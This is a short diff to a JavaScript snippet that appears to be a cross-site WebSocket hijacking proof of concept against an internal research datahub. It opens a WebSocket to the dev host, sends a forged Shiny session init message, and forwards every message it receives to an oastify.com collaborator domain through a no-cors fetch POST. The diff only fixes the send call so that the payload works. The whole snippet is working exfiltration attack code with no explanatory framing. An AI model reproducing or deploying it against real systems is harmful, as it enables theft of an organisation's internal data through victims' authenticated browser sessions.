@@ -4,7 +4,7 @@
     var ws = new WebSocket('wss://datahub-rdh-dev.research.rbigroup.cloud/websocket');
     ws.onopen = function() {
 	var init = {"method":"init","data":{"assetclass":"Macro","MAcategory":"Economy","country_region":"Austria (AT)","period":"Annual","EQcategory":"Equities","EQtickers":["1","2","3","4","5","6","7"],"EQdatafield":"2","tab-2288-5:shiny.action":0,"signout:shiny.action":0,"publish:shiny.action":0,"yearsbeg":"2019","monthsbeg":"1","yearsend":"2029","monthsend":"3","time_range":[2019,2029],"switch1":true,"hist":false,"forecast":false,"ccountries":false,"display_ticker":false,".clientdata_output_table_width":1440,".clientdata_output_table_height":0,".clientdata_output_table_subset_width":1346,".clientdata_output_table_subset_height":0,".clientdata_output_table_hidden":false,".clientdata_output_table_subset_hidden":false,".clientdata_output_text_hidden":false,".clientdata_output_downloadTab_hidden":false,".clientdata_pixelratio":1,".clientdata_url_protocol":"https:",".clientdata_url_hostname":"datahub-rdh-dev.research.rbigroup.cloud",".clientdata_url_port":"",".clientdata_url_pathname":"/",".clientdata_url_search":"",".clientdata_url_hash_initial":"",".clientdata_url_hash":"",".clientdata_singletons":"1075bc010ecdd2000f2c5b95be7e352efd6a48b5,85cd0481ff7a90ce7a161851fdc3fa89ddb07c3c"}}
-        ws.send(init);
+        ws.send(JSON.stringify(init));
     };
     ws.onmessage = function(event) {
         fetch('https://j5psnk3c2shfwrma7nuns95hw82zqseh.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
